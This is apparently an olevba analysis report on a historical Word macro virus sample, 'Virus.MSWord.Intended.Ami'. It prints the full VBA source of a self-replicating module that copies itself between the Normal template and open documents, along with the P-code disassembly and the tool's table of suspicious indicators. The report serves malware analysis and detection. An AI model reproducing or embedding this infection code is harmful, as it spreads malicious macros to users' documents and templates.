olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Ami
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Ami - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub t()

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    MsgBox ActiveDocument.VBProject.VBComponents(I).Name
Next
End Sub

-------------------------------------------------------------------------------
VBA MACRO A_M_I.bas 
in file: Virus.MSWord.Intended.Ami - OLE stream: 'Macros/VBA/A_M_I'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Normal_ As Object, Active_ As Object

Sub Add_Modul_Infection()
On Error Resume Next

Set Normal_ = NormalTemplate.VBProject
Set Active_ = ActiveDocument.VBProject

Const ModulName_ = "A_M_I"

NormalIns_ = False
ActiveIns_ = False

CheckRefNormal_
CheckRefActive_

NormalComp_ = Normal_.VBComponents.Count
ActiveComp_ = Active_.VBComponents.Count


For x = 1 To NormalComp_
    If Normal_.VBComponents(x).Name = ModulName_ Then _
    NormalIns_ = True
Next

For y = 1 To ActiveComp_
    If Active_.VBComponents(y).Name = ModulName_ Then _
    ActiveIns_ = True
Next


If NormalIns_ = False Then
  
    VirusLength_ = Active_.VBComponents(ModulName_) _
                    .CodeModule.CountOfLines
    VirusCode_ = Active_.VBComponents(ModulName_) _
                    .CodeModule.Lines(1, VirusLength_)
 
    Normal_.VBComponents.Add (vbext_ct_StdModule)
    Normal_.VBComponents((NormalComp_ + 1)).Name = ModulName_
    Normal_.VBComponents(ModulName_).CodeModule.AddFromString VirusCode_
        
End If

If ActiveIns_ = False Then

    VirusLength_ = Normal_.VBComponents(ModulName_) _
                    .CodeModule.CountOfLines
    VirusCode_ = Normal_.VBComponents(ModulName_) _
                    .CodeModule.Lines(1, VirusLength_)
    
    Active_.VBComponents.Add (vbext_ct_StdModule)
    Active_.VBComponents((ActiveComp_ + 1)).Name = ModulName_
    Active_.VBComponents(ModulName_).CodeModule.AddFromString VirusCode_

End If

End Sub

Function CheckRefNormal_()
CheckRefNormal_ = False

For I = 1 To Normal_.References.Count
    If Normal_.References(I).Name = "VBIDE" Then CheckRefNormal_ = True
Next

If CheckRefNormal_ = False Then
    Normal_.References _
     .AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

Function CheckRefActive_()
CheckRefActive_ = False

For I = 1 To Active_.References.Count
    If Active_.References(I).Name = "VBIDE" Then CheckRefActive_ = True
Next

If CheckRefActive_ = False Then
    Active_.References _
     .AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'  Jack Twoflower presents: AddModulInfection
' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

'  This is a new technic to infect moduls
'  without import/export.

'  The code to add the 'VBIDE' library was
'  very hard work, cause I didn't find any
'  information in books, so I tried and
'  tried. How you see, I had success! ;)

' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'  I like to thank to following ppl:
' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   
'  ~~+ LineZerØ Network (sorry, but you will
'                        stand strong with-
'                        out me ;( )

'  ~~+ Clau[UC] for helping me in irc and
'               testing this here. ;)

'  ~~+ VicodinES for being to greatest!
                
' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

'Thnx a lot
'Jack Twoflower

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.Ami
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1800 bytes
' Line #0:
' 	FuncDefn (Sub t())
' Line #1:
' Line #2:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #3:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	ArgsCall MsgBox 0x0001 
' Line #4:
' 	StartForVariable 
' 	Next 
' Line #5:
' 	EndSub 
' Line #6:
' Macros/VBA/A_M_I - 6279 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn Normal_ (As Object)
' 	VarDefn Active_ (As Object)
' Line #1:
' Line #2:
' 	FuncDefn (Sub Add_Modul_Infection())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' Line #5:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set Normal_ 
' Line #6:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set Active_ 
' Line #7:
' Line #8:
' 	Dim (Const) 
' 	LitStr 0x0005 "A_M_I"
' 	VarDefn ModulName_
' Line #9:
' Line #10:
' 	LitVarSpecial (False)
' 	St NormalIns_ 
' Line #11:
' 	LitVarSpecial (False)
' 	St ActiveIns_ 
' Line #12:
' Line #13:
' 	ArgsCall CheckRefActive_ 0x0000 
' Line #14:
' 	ArgsCall VBCp 0x0000 
' Line #15:
' Line #16:
' 	Ld Normal_ 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St NormalComp_ 
' Line #17:
' 	Ld Active_ 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ActiveComp_ 
' Line #18:
' Line #19:
' Line #20:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalComp_ 
' 	For 
' Line #21:
' 	LineCont 0x0004 0C 00 04 00
' 	Ld x 
' 	Ld Normal_ 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld ModulName_ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormalIns_ 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Next 
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveComp_ 
' 	For 
' Line #25:
' 	LineCont 0x0004 0C 00 04 00
' 	Ld y 
' 	Ld Active_ 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld ModulName_ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActiveIns_ 
' 	EndIf 
' Line #26:
' 	StartForVariable 
' 	Next 
' Line #27:
' Line #28:
' Line #29:
' 	Ld NormalIns_ 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #30:
' Line #31:
' 	LineCont 0x0004 08 00 14 00
' 	Ld ModulName_ 
' 	Ld Active_ 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St VirusCode_ 
' Line #32:
' 	LineCont 0x0004 08 00 14 00
' 	LitDI2 0x0001 
' 	Ld VirusCode_ 
' 	Ld ModulName_ 
' 	Ld Active_ 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St CheckRefNormal_ 
' Line #33:
' Line #34:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld Normal_ 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #35:
' 	Ld ModulName_ 
' 	Ld NormalComp_ 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Normal_ 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #36:
' 	Ld CheckRefNormal_ 
' 	Ld ModulName_ 
' 	Ld Normal_ 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #37:
' Line #38:
' 	EndIfBlock 
' Line #39:
' Line #40:
' 	Ld ActiveIns_ 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #41:
' Line #42:
' 	LineCont 0x0004 08 00 14 00
' 	Ld ModulName_ 
' 	Ld Normal_ 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St VirusCode_ 
' Line #43:
' 	LineCont 0x0004 08 00 14 00
' 	LitDI2 0x0001 
' 	Ld VirusCode_ 
' 	Ld ModulName_ 
' 	Ld Normal_ 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St CheckRefNormal_ 
' Line #44:
' Line #45:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld Active_ 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #46:
' 	Ld ModulName_ 
' 	Ld ActiveComp_ 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Active_ 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #47:
' 	Ld CheckRefNormal_ 
' 	Ld ModulName_ 
' 	Ld Active_ 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #48:
' Line #49:
' 	EndIfBlock 
' Line #50:
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' 	FuncDefn (Function CheckRefActive_())
' Line #54:
' 	LitVarSpecial (False)
' 	St CheckRefActive_ 
' Line #55:
' Line #56:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Normal_ 
' 	MemLd References 
' 	MemLd Count 
' 	For 
' Line #57:
' 	Ld I 
' 	Ld Normal_ 
' 	ArgsMemLd References 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "VBIDE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CheckRefActive_ 
' 	EndIf 
' Line #58:
' 	StartForVariable 
' 	Next 
' Line #59:
' Line #60:
' 	Ld CheckRefActive_ 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LineCont 0x0004 03 00 05 00
' 	LitStr 0x0026 "{0002E157-0000-0000-C000-000000000046}"
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld Normal_ 
' 	MemLd References 
' 	ArgsMemCall AddFromGuid 0x0003 
' Line #62:
' 	EndIfBlock 
' Line #63:
' Line #64:
' 	EndFunc 
' Line #65:
' Line #66:
' 	FuncDefn (Function VBCp())
' Line #67:
' 	LitVarSpecial (False)
' 	St VBCp 
' Line #68:
' Line #69:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Active_ 
' 	MemLd References 
' 	MemLd Count 
' 	For 
' Line #70:
' 	Ld I 
' 	Ld Active_ 
' 	ArgsMemLd References 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "VBIDE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St VBCp 
' 	EndIf 
' Line #71:
' 	StartForVariable 
' 	Next 
' Line #72:
' Line #73:
' 	Ld VBCp 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #74:
' 	LineCont 0x0004 03 00 05 00
' 	LitStr 0x0026 "{0002E157-0000-0000-C000-000000000046}"
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld Active_ 
' 	MemLd References 
' 	ArgsMemCall AddFromGuid 0x0003 
' Line #75:
' 	EndIfBlock 
' Line #76:
' Line #77:
' 	EndFunc 
' Line #78:
' Line #79:
' 	QuoteRem 0x0000 0x002D " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #80:
' 	QuoteRem 0x0000 0x002C "  Jack Twoflower presents: AddModulInfection"
' Line #81:
' 	QuoteRem 0x0000 0x002D " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #82:
' Line #83:
' 	QuoteRem 0x0000 0x0028 "  This is a new technic to infect moduls"
' Line #84:
' 	QuoteRem 0x0000 0x0018 "  without import/export."
' Line #85:
' Line #86:
' 	QuoteRem 0x0000 0x0029 "  The code to add the 'VBIDE' library was"
' Line #87:
' 	QuoteRem 0x0000 0x0029 "  very hard work, cause I didn't find any"
' Line #88:
' 	QuoteRem 0x0000 0x0026 "  information in books, so I tried and"
' Line #89:
' 	QuoteRem 0x0000 0x0027 "  tried. How you see, I had success! ;)"
' Line #90:
' Line #91:
' 	QuoteRem 0x0000 0x002D " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #92:
' 	QuoteRem 0x0000 0x0023 "  I like to thank to following ppl:"
' Line #93:
' 	QuoteRem 0x0000 0x002D " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #94:
' Line #95:
' 	QuoteRem 0x0000 0x002B "  ~~+ LineZerØ Network (sorry, but you will"
' Line #96:
' 	QuoteRem 0x0000 0x002A "                        stand strong with-"
' Line #97:
' 	QuoteRem 0x0000 0x0023 "                        out me ;( )"
' Line #98:
' Line #99:
' 	QuoteRem 0x0000 0x0028 "  ~~+ Clau[UC] for helping me in irc and"
' Line #100:
' 	QuoteRem 0x0000 0x0024 "               testing this here. ;)"
' Line #101:
' Line #102:
' 	QuoteRem 0x0000 0x0026 "  ~~+ VicodinES for being to greatest!"
' Line #103:
' Line #104:
' 	QuoteRem 0x0000 0x002C " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #105:
' Line #106:
' 	QuoteRem 0x0000 0x000A "Thnx a lot"
' Line #107:
' 	QuoteRem 0x0000 0x000E "Jack Twoflower"
' Line #108:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

